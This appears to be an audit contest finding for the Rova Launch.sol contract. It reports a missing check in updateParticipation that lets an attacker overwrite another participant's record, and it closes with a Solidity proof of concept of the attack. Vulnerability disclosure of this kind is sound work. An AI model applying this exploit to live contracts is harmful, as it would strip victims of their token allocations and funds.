# Malicious actor will overwrite participation records for legitimate participants

### Summary

The missing validation check for `newLaunchParticipationId` in the `updateParticipation` function will cause unauthorized record overwrites for legitimate participants as a malicious actor will supply an already used participation ID, thereby overwriting an existing participation record.


### Root Cause

In `Launch.sol` in the `updateParticipation` [function](https://github.com/sherlock-audit/2025-02-rova/blob/main/rova-contracts/src/Launch.sol#L312C1-L313C1) there is a missing check to ensure that `launchGroupParticipations[request.newLaunchParticipationId]` is unused before writing the updated participation record.

### Internal Pre-conditions

1. The attacker needs to call `updateParticipation` using a valid signature and with a participation record they control.  
2. The attacker needs to supply a `newLaunchParticipationId` that is already in use by an existing (and mutable) participation record.  
3. The state of the contract must allow updates (i.e., the participation is not finalized).

### External Pre-conditions

1. No external protocol changes are required; the vulnerability is entirely due to the contract's internal logic.

### Attack Path

1. The attacker identifies a participation record they control (with ID_A) and a victim's participation record that is still mutable (with ID_B).  
2. The attacker calls `updateParticipation`, providing their own participation ID (`prevLaunchParticipationId = ID_A`) and setting `newLaunchParticipationId = ID_B` (the victim's record).  
3. The contract, lacking a check for an existing record at `newLaunchParticipationId`, overwrites the victim’s participation record with the new data supplied by the attacker.


### Impact

Legitimate participants suffer an approximate loss of their participation record, including any associated token allocations and funds, while the attacker effectively cancels or seizes control over the victim’s participation.

### PoC

```solidity
// Assume attacker controls a valid participation record with ID_A,
// and victim has an active participation record with ID_B.

ParticipationInfo memory attackerParticipation = launchGroupParticipations[ID_A];
require(attackerParticipation.userId != bytes32(0), "Attacker must have a valid participation");

// The attacker crafts an update request with the victim's ID as the new ID
UpdateParticipationRequest memory craftedRequest = UpdateParticipationRequest({
    launchId: launchId,
    launchGroupId: victimLaunchGroupId,
    chainId: block.chainid,
    requestExpiresAt: block.timestamp + 300, // 5 minutes ahead
    userAddress: attackerAddress,
    prevLaunchParticipationId: ID_A,
    newLaunchParticipationId: ID_B, // victim's participation ID
    userId: attackerParticipation.userId, // attacker reusing their own userId
    tokenAmount: attackerParticipation.tokenAmount,
    currency: attackerParticipation.currency
});

// Attacker signs the request with a valid signature
bytes memory validSignature = signUpdateParticipation(craftedRequest, attackerPrivateKey);

// Calling updateParticipation overwrites the victim's record
launch.updateParticipation(craftedRequest, validSignature);
```

This PoC demonstrates how an attacker can supply an existing participation ID as the `newLaunchParticipationId` in the `updateParticipation` call, leading to the overwriting of the victim’s record.
